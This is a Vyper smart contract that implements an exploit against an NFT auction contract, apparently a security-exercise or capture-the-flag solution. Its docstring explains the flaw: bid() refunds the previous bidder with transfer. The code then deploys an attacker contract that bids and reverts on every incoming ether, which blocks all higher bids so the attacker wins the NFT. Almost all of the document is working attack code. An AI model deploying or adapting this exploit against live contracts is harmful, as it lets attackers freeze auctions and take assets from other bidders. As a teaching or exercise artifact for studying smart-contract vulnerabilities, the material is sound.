# @version ^0.3.7

"""
The vulnerability is in the `bid()` function of the Auction 
contract. When a bid previous bid has been made the contract 
will check if the new bid is higher than the previous bid, and
if it is the contract will send the old bidder their bid. The 
contract does this via the `transfer` low level function. This 
function reverts on failure. It will never revert if the target 
is an EOA, but what if the target is a Contract? An attacker can 
create a malicious contract that will bid the lowest amount possible
and in their contract will revert when it receives ETHER. This will 
make it so that the transfer call in the `bid()` function will always 
fail whenever someone new tries to bid higher. No other user will be able
to bid and the attacker will only have to wait until the auction ends to 
collext their NFT.
"""

from vyper.interfaces import ERC721 as IERC721

interface IAuction:
    def nftContract() -> address: view 
    def collect(_id: uint256): nonpayable

owner: immutable(address)

auction: address

@external
@payable
def __init__(_auction: address):
    assert msg.value > as_wei_value(1, "ether"), "send > 1 ETH"
    owner = msg.sender
    self.auction = _auction

@external
def start_attack(id: uint256):
    assert msg.sender == owner, "!owner"
    raw_call(
        self.auction,
        _abi_encode(
            id,
            method_id=method_id("bid(uint256)"),
        ),
        value=self.balance,
    )

@external
def finish_attack(id: uint256):
    assert msg.sender == owner, "!owner"
    IAuction(self.auction).collect(id)

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[32]
) -> bytes4:
    assert msg.sender == IAuction(self.auction).nftContract(), "!nft"
    IERC721(msg.sender).transferFrom(self, owner, tokenId)    
    return convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )

@external
@payable
def __default__():
    raise
